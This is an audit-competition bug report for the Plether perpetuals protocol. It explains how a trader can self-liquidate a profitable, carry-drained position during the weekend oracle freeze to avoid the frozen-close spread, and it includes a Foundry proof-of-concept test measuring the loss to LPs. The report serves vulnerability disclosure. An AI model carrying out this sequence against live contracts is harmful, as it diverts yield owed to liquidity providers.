# \#99336 [SC-Medium] Profitable position with a carry-drained pledge can self-liquidate over the weekend and skip the frozen-close spread

**Submitted on Nov 13th 2026 at 08:16:58 UTC by @niroh for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99336
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield

## Description

### Description
During the oracle-frozen weekend a voluntary close is priced at the stored Friday mark and charged a fixed spread (`frozenCloseSpreadBps`, 50 bps at release) on top of the 4 bps execution fee (`packages/perps/src/libraries/CloseAccountingLib.sol:120-124`). The spread is LP revenue and is the price of exiting at a stale mark while the real market can move.

Liquidation is exempt from the spread. It charges only the liquidation charge (`bountyBps`, 10 bps, capped by the prepaid liquidation reserve), of which `keeperShareBps` (50%) is credited to the caller. `OrderRouter.executeLiquidation` is permissionless and passes `msg.sender` as the keeper with no requirement that it differ from the liquidated account (`packages/perps/src/router/OrderLiquidationBatchLogic.sol:706-729`).

`CfdEnginePlanLib.planLiquidation` treats a position as liquidatable in two independent cases:

```solidity
// packages/perps/src/libraries/CfdEnginePlanLib.sol:1440-1469
delta.pendingCarryAssets = _pendingCarryAssets(snap);
delta.realizedCarryAssets = _applyPendingCarryRealizationToSnapshot(snap, delta.pendingCarryAssets);
...
delta.riskState = PositionRiskAccountingLib.buildExactPriceRiskState(
    pos, snap.positionEntryCostAssetAtoms, price, snap.capPrice,
    pos.margin + snap.traderClaimBalanceForAccount, maintMarginBps
);

if (!delta.riskState.liquidatable && delta.pendingCarryAssets == delta.realizedCarryAssets) {
    return delta;
}
delta.riskState.liquidatable = true;
delta.liquidatable = true;
```

The second case fires whenever any pending carry cannot be collected, however healthy the position is on price. Carry can be collected only from the PnL pledge and then free settlement (`packages/perps/src/libraries/MarginClearinghouseAccountingLib.sol:95-107`). Price health, in contrast, is pledge plus claim plus unrealized PnL. Unrealized profit therefore keeps a position above the maintenance or weekend requirement while contributing nothing toward carry.

Carry is designed to be paid out of the pledge. A position opened near the 0.2% initial margin and held while in profit reaches a zero pledge after ordinary carry accrual (about 15 days at full side utilization, about 37 days at 40%). From then on the owner keeps it alive by holding a little free settlement. The moment the owner stops, one second of accrued carry is uncovered and the position is liquidatable, although its price equity is far above the 3% weekend requirement.

The owner controls that moment. Withdrawing free settlement with an open position is allowed whenever the position is price-healthy (`packages/perps/src/CfdEngineSettlementSidecar.sol:287-305`), and during the frozen window the Friday mark satisfies the withdrawal freshness check for up to `fadMaxStaleness` (three days). The sequence is:

1. A LONG is opened with just over the initial margin and no spare free settlement. The basket moves in its favor by more than the weekend requirement (3% of notional).
2. Carry consumes the pledge over the following weeks. The owner keeps the position carry-covered with small free-settlement deposits.
3. During the frozen weekend, when the owner decides to exit (for example on adverse weekend news), it withdraws the remaining free settlement. One second later pending carry exceeds realized carry.
4. The owner calls `executeLiquidation` on its own account with an empty Pyth payload. The oracle replays the stored Friday mark with a small deterministic adverse shift (`packages/perps/src/PletherOracle.sol:729-743`). The liquidation pays the full price gain less the unpaid carry (`CfdEnginePlanLib.sol:1512-1513`, `:1529`), takes the liquidation charge from the reserve, and returns half of it to the owner as keeper.

No frozen-close spread and no execution fee are assessed. If the weekend news is favorable the owner simply keeps the position.

A voluntary close of the same position does pay the spread in full: for a position in profit the action charges are withheld from the price gain before payout (`CfdEnginePlanLib.sol:1046-1051`), so nothing is waived. This is what separates the case from a position that is merely thin on margin, where the spread would largely be uncollectible anyway.

A third party can also liquidate once carry is uncovered. That does not protect LPs: the exit still happens at the Friday mark without the spread, and the owner's cost rises only from about 5 bps to about 10 bps.

The same carry branch is reachable with a trader claim in place of unrealized profit (a claim also counts toward price health and cannot pay carry). That route needs the pool to have been short of cash at an earlier profitable close. The profit route needs only an ordinary winning position and elapsed time.

`SECURITY.md` documents that uncovered carry makes an account liquidatable and that liquidations do not assess the spread. It does not address an owner inducing the uncovered state on a price-healthy position in order to use liquidation as a spread-free exit.

### Root cause
`CfdEnginePlanLib.planLiquidation` (lines 1465-1469) makes carry delinquency alone sufficient for liquidation, while the collateral that satisfies carry (pledge and free settlement) is narrower than the collateral that satisfies price health (pledge, claim and unrealized profit). The owner of a profitable position can therefore switch its own position into the liquidatable state at will. Because frozen-window liquidation carries no spread and `executeLiquidation` allows the account to be its own keeper, that state is a cheaper substitute for the voluntary frozen close the spread was meant to price.

### Impact
**High: Theft of unclaimed yield.**

The frozen-close spread is LP-owned yield. It is charged on every voluntary exit at the stale mark and is never protocol-treasury revenue. The sequence takes the same stale-mark exit through liquidation, so the spread that the exit would have generated for LPs is not paid and stays with the trader.

In the measured case the trader retains 4,011.65 USDG (41 bps of notional) and pool cash is 3,627.69 USDG lower than under the voluntary close. Deposited LP principal is not taken; the loss is the yield owed for the exit, together with the weekend gap protection that yield pays for.

### Impact details
LPs forgo the frozen-close spread on every exit taken this way and carry the weekend gap risk it was meant to pay for. The trader holds a weekend exit option at Friday's price for roughly the liquidation charge.

Measured on release parameters by the PoC, for a LONG of 999,900 USDG entry notional that is 4% in profit at a Friday mark of $1.056 (exit notional 959,904 USDG), both exits taken from the same state on Saturday:

| Exit | Trader balance afterwards (USDG) |
| --- | --- |
| Self-liquidation | 40,290.86 |
| Voluntary frozen close | 36,279.21 |

The trader is 4,011.65 USDG better off (41 bps of notional) and pool cash is 3,627.69 USDG lower (38 bps of notional) than under the voluntary close. Price equity at that point is 39,996 USDG against a 3% weekend requirement of 28,797 USDG, and the account holds no trader claim. The control test shows that the same position cannot be liquidated by anyone while the owner keeps carry covered.

The exit is available on every frozen weekend to any position that is in profit by more than the weekend requirement and whose pledge has been consumed by carry.

### Code References
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:1440-1469` (carry delinquency alone sets `liquidatable`)
- `packages/perps/src/libraries/MarginClearinghouseAccountingLib.sol:95-107` (carry is collectible only from pledge and free settlement)
- `packages/perps/src/router/OrderLiquidationBatchLogic.sol:706-729` (permissionless liquidation, caller is keeper, no spread)

## Proof of Concept

### How to run
The test file is already in the repository layout below; no other change is needed.

1. Save the code as `packages/perps/test/perps/poc/ProfitBackedCarrySelfLiquidation.t.sol`.
2. From the repository root run:

```bash
forge test --root packages/perps --match-path "test/perps/poc/ProfitBackedCarrySelfLiquidation.t.sol" -vv
```

`test_SelfLiquidationSkipsTheFrozenCloseSpread` takes both exits from one snapshot and logs the difference. `test_Control_CarryCoveredPositionIsNotLiquidatable` shows the position is not liquidatable while carry is covered.

### POC code
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {console2} from "forge-std/console2.sol";

/// @notice A profitable position whose pledge has been consumed by carry can be self-liquidated during the
///         oracle-frozen weekend, exiting at the stale Friday mark without the frozen-close spread.
///
/// `CfdEnginePlanLib.planLiquidation` marks any position liquidatable when pending carry exceeds what the pledge and
/// free settlement can pay, regardless of price health. Unrealized profit counts toward price health but cannot pay
/// carry. A winning position whose pledge has been drained by ordinary carry is therefore price-healthy and, as soon
/// as its owner stops topping up free settlement, liquidatable. Liquidation assesses no frozen-close spread and the
/// owner may act as its own keeper.
///
/// No trader claim is involved: the only inputs are an ordinary open, a favorable price move, and elapsed time.
contract ProfitBackedCarrySelfLiquidationTest is BasePerpTest {

    address private constant TRADER = address(0xC0FFEE01);
    address private constant ORGANIC = address(0x7EADE5);
    address private constant THIRD_PARTY_KEEPER = address(0xBEEF);

    /// @dev Monday 2024-03-04 10:00 UTC is the fixture start (live market).
    /// @dev Friday 2024-04-19 20:00 UTC: live, one hour before the recurring freeze (New York daylight time).
    uint256 private constant FRIDAY_LIVE = 1_713_556_800;
    /// @dev Friday 2024-04-19 21:00 UTC: first instant of the oracle-frozen window.
    uint256 private constant FRIDAY_FREEZE = 1_713_560_400;
    /// @dev Saturday 2024-04-20 12:00 UTC: mid-frozen-window.
    uint256 private constant SATURDAY_FROZEN = 1_713_614_400;

    uint256 private constant ENTRY_PRICE = 110_000_000; // $1.10
    uint256 private constant FRIDAY_MARK = 105_600_000; // $1.056, 4% in the LONG's favor
    uint256 private constant LOTS = 9090;
    uint256 private constant SIZE = LOTS * CfdTypes.SIZE_QUANTUM;
    uint256 private constant ENTRY_NOTIONAL = LOTS * ENTRY_PRICE; // 999,900 USDG
    uint256 private constant EXIT_NOTIONAL = LOTS * FRIDAY_MARK; // 959,904 USDG

    /// @dev Release parameters from DEPLOYMENT.md.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 10_000_000e6;
    }

    function _mark(
        uint256 price,
        uint256 atTimestamp
    ) private {
        uint256 at = atTimestamp;
        uint256 floorTime = uint256(engine.lastMarkTime()) + 1;
        if (at < floorTime) {
            at = floorTime;
        }
        vm.warp(at);
        vm.prank(address(router));
        engine.updateMarkPrice(price, uint64(at));
    }

    function _positionSize(
        address account
    ) private view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    /// @dev Ordinary lifecycle up to Friday evening: a minimum-pledge open, a 4% favorable move, and 46 days of
    ///      carry. The owner then keeps the position carry-covered with a small free-settlement top-up.
    function _reachFridayLive() private {
        // Monday: open a ~1M USDG LONG with just over the 0.2% initial margin and no spare free settlement.
        _mark(ENTRY_PRICE, block.timestamp);
        uint256 margin = 4000e6;
        _fundTrader(TRADER, margin);
        _open(TRADER, CfdTypes.Side.LONG, SIZE, margin, ENTRY_PRICE);
        assertEq(_freeSettlementAssets(TRADER), 0, "all deposited margin is consumed by the open");

        // Unrelated same-side open interest gives the LONG side its utilization (and therefore its carry rate).
        _fundTrader(ORGANIC, 200_000e6);
        _open(ORGANIC, CfdTypes.Side.LONG, 27_272 * CfdTypes.SIZE_QUANTUM, 150_000e6, ENTRY_PRICE);

        // Tuesday: the basket falls 4%; a LONG profits when the basket falls.
        _mark(FRIDAY_MARK, block.timestamp + 1 days);

        // Friday 2024-04-19 20:00 UTC, live market, final mark before the weekend.
        _mark(FRIDAY_MARK, FRIDAY_LIVE);
        assertFalse(engine.isOracleFrozen(), "Friday 20:00 UTC is still live");

        // The owner tops up a little free settlement. The deposit hook collects all carry accrued so far: the pledge
        // is exhausted and the remainder comes from the top-up, so the position is carry-covered again.
        _fundTrader(TRADER, 1000e6);
        assertEq(clearinghouse.pnlPledgeAssets(TRADER), 0, "46 days of carry have consumed the whole pledge");
        assertEq(engine.unsettledCarryAssets(TRADER), 0, "carry is fully paid after the top-up");
    }

    /// @dev At the freeze the owner removes the top-up; from then on accruing carry has nothing to draw on.
    function _reachCarryUncoveredFrozenState() private {
        _reachFridayLive();

        vm.warp(FRIDAY_FREEZE);
        assertTrue(engine.isOracleFrozen(), "Friday 21:00 UTC is oracle-frozen");
        // A zero-amount withdrawal collects the last hour of carry; the remaining free settlement is then withdrawn.
        vm.prank(TRADER);
        clearinghouse.withdrawMargin(0);
        uint256 free = _freeSettlementAssets(TRADER);
        vm.prank(TRADER);
        clearinghouse.withdrawMargin(free);
        assertEq(_freeSettlementAssets(TRADER), 0, "no free settlement remains");
        assertEq(clearinghouse.pnlPledgeAssets(TRADER), 0, "no pledge remains");

        vm.warp(SATURDAY_FROZEN);
        assertTrue(engine.isOracleFrozen(), "Saturday is oracle-frozen");
    }

    /// @notice While the owner keeps carry covered, the position cannot be liquidated by anyone.
    function test_Control_CarryCoveredPositionIsNotLiquidatable() public {
        _reachFridayLive();
        vm.warp(FRIDAY_FREEZE + 1 hours);

        ICfdEngineTypes.LiquidationPreview memory preview = engineLens.previewLiquidation(TRADER, FRIDAY_MARK);
        assertFalse(preview.liquidatable, "carry-covered, price-healthy position is not liquidatable");

        bytes[] memory frozenReplay = new bytes[](1);
        frozenReplay[0] = "";
        vm.prank(THIRD_PARTY_KEEPER);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__PositionIsSolvent.selector);
        router.executeLiquidation(TRADER, frozenReplay);
    }

    /// @notice Once the top-up is withdrawn the position is liquidatable although its price equity is above the
    ///         3% weekend requirement.
    function test_CarryUncoveredWhilePriceHealthy() public {
        _reachCarryUncoveredFrozenState();

        ICfdEngineTypes.LiquidationPreview memory preview = engineLens.previewLiquidation(TRADER, FRIDAY_MARK);
        uint256 fadRequirement = (EXIT_NOTIONAL * 300) / 10_000;

        console2.log("price equity (USDG atoms):        ", preview.equityAssets);
        console2.log("3% weekend requirement:           ", fadRequirement);
        console2.log("trader claim balance:             ", engine.traderClaimBalanceAssets(TRADER));

        assertTrue(preview.liquidatable, "carry-uncovered position is liquidatable");
        assertGt(preview.equityAssets, int256(fadRequirement), "price equity exceeds the 3% weekend requirement");
        assertEq(engine.traderClaimBalanceAssets(TRADER), 0, "no trader claim is involved");
    }

    /// @notice Measures both exits from one identical state at the stale Friday mark.
    function test_SelfLiquidationSkipsTheFrozenCloseSpread() public {
        _reachCarryUncoveredFrozenState();
        uint256 branch = vm.snapshotState();

        // ---- Exit A: the owner liquidates its own position (owner is the keeper) ----
        bytes[] memory frozenReplay = new bytes[](1);
        frozenReplay[0] = "";
        vm.prank(TRADER);
        router.executeLiquidation(TRADER, frozenReplay);
        assertEq(_positionSize(TRADER), 0, "self-liquidation closes the position");
        uint256 afterSelfLiquidation = clearinghouse.balanceAssets(TRADER);
        uint256 poolAfterSelfLiquidation = pool.totalAssets();

        vm.revertToState(branch);

        // ---- Exit B: voluntary close of the same position at the same stale mark ----
        ICfdEngineTypes.ClosePreview memory closePreview = engineLens.previewClose(TRADER, SIZE, FRIDAY_MARK);
        _close(TRADER, CfdTypes.Side.LONG, SIZE, FRIDAY_MARK);
        assertEq(_positionSize(TRADER), 0, "voluntary close closes the position");
        uint256 afterVoluntaryClose = clearinghouse.balanceAssets(TRADER);
        uint256 poolAfterVoluntaryClose = pool.totalAssets();

        uint256 traderAdvantage = afterSelfLiquidation - afterVoluntaryClose;
        uint256 lpShortfall = poolAfterVoluntaryClose - poolAfterSelfLiquidation;

        console2.log("exit notional at Friday mark (USDG atoms):", EXIT_NOTIONAL);
        console2.log("trader balance after self-liquidation:    ", afterSelfLiquidation);
        console2.log("trader balance after voluntary close:     ", afterVoluntaryClose);
        console2.log("trader advantage:                         ", traderAdvantage);
        console2.log("trader advantage in bps of notional:      ", (traderAdvantage * 10_000) / EXIT_NOTIONAL);
        console2.log("frozen spread assessed on voluntary close:", closePreview.frozenSpreadAssets);
        console2.log("frozen spread actually paid to LPs:       ", closePreview.frozenSpreadPaidAssets);
        console2.log("pool cash shortfall versus voluntary close:", lpShortfall);

        // On the voluntary path the 50 bps spread is assessed and, because the position is in profit, withheld from
        // the price gain. The preview nets the ~500 USDG VPI refund that the same close earns for removing its own
        // skew against the spread, so its "paid" figure is the assessed spread minus that refund.
        assertEq(closePreview.frozenSpreadAssets, (EXIT_NOTIONAL * 50) / 10_000, "50 bps assessed");
        assertGt(closePreview.frozenSpreadPaidAssets, (EXIT_NOTIONAL * 40) / 10_000, "spread is collectible");
        // Self-liquidation leaves the trader better off by most of that spread.
        assertGt(traderAdvantage, (EXIT_NOTIONAL * 35) / 10_000, "self-liquidation saves more than 35 bps of notional");
        assertGt(lpShortfall, (EXIT_NOTIONAL * 35) / 10_000, "LP cash is lower by more than 35 bps of notional");
    }

}
```
